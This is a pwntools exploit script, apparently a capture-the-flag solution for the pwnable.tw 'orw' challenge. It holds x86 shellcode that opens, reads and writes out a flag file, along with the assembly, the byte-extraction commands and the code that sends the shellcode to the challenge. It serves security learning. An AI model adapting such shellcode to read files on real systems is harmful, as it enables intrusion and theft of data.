# /usr/bin/env python3

from pwn import *

"""
section .text

global _start

_start:
        jmp two

one:
        xor eax, eax

        ;; open
        pop ebx
        mov al, 0x5
        int 0x80

        ;; read
        xor edx, edx
        mov ebx, eax
        mov al, 0x3
        mov ecx, esp
        sub esp, 0x55
        mov dl, 0x55
        int 0x80

        ;; write
        xor eax, eax
        mov al, 0x4
        mov bl, 0x1
        int 0x80

        ;; exit
        xor eax, eax
        xor ebx, ebx
        mov al, 1
        mov bl, 99
        int 0x80

two:
        call one
        string: db "/home/orw/flag"



$ nasm -f elf32 shellcode.s && ld -m elf_i386 -z execstack shellcode.o -o shellcode
$ objdump -d shellcode |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"""

elf = ELF("./orw")

shellcode = b"\xeb\x28\x31\xc0\x5b\xb0\x05\xcd\x80\x31\xd2\x89\xc3\xb0\x03\x89\xe1\x83\xec\x55\xb2\x55\xcd\x80\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x63\xcd\x80\xe8\xd3\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x6f\x72\x77\x2f\x66\x6c\x61\x67"

gdbscript = """b main
"""

if args.REMOTE:
    io = remote("chall.pwnable.tw", 10001)
elif args.GDB:
    io = gdb.debug(elf.path, gdbscript=gdbscript)
else:
    io = process(elf.path)

io.sendafter(b"Give my your shellcode:", shellcode)
log.info(io.recvallS())
